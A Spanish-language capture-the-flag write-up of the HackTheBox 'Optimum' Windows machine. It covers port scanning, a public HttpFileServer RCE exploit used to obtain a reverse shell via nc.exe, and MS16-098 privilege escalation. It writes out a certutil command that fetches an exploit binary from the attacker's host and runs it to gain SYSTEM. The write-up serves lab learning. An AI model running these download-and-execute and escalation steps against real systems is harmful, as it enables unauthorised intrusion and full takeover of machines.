---
title: HackTheBox - Optimum
author: cotes
date: 2023-09-14 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'HttpFileServer RCE (CVE-2014-6287)', 'MS16-098']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Optimum/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Optimum Machine Logo
---

Máquina Windows de nivel **Easy** de HackTheBox.

Técnicas usadas: **HttpFileServer RCE (CVE-2014-6287), MS16-098**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Optimum/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Optimum/02-versions.png)

    * Al buscar por alguna vulnerabilidad en **HttpFileServer 2.3** llegamos a un [RCE](https://www.exploit-db.com/exploits/39161)

c. Para ejecutar este script, cambiamos las variables 'ip_addr' y 'local_port', además de levantar un servidor http con python en el puerto 80 ofreciendo **nc.exe**

![](/assets/images/HTB/Easy/Optimum/03-rce.png)

> Ejecutamos el script varias veces hasta recibir la **reverse shell**
{: .prompt-tip }

### Escalada de Privilegios 💹

a. Para la escalada de privilegios usaremos [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

* Copiamos el output del comando `systeminfo` en un fichero.
* La base de datos a usar la podemos descargar de [win-exp-suggester](https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester)
* En caso de tener un algún error con el script instalamos `pip install xlrd==1.2.0`


```bash
❯ python2 windows_exploit_suggester.py -i info.txt -d 2017-06-14-mssb.xls

<SNIP>
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                                                                           
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
<SNIP>
```

b. Descargamos el fichero [41020.exe](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe) y lo transferimos a la máquina víctima

```bash
❯ python -m http.server 80
--------------------------------------------------------------------------------------------------------
C:\Users\kostas\Documents>certutil.exe -f -urlcache -split "http://10.10.14.18/41020.exe" ".\41020.exe"
```

* Por último, ejecutamos el script y seremos **nt authority\system**

    ```cmd
    C:\Users\kostas\Documents>.\41020.exe                                    
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\kostas\Documents>whoami
    nt authority\system
    ```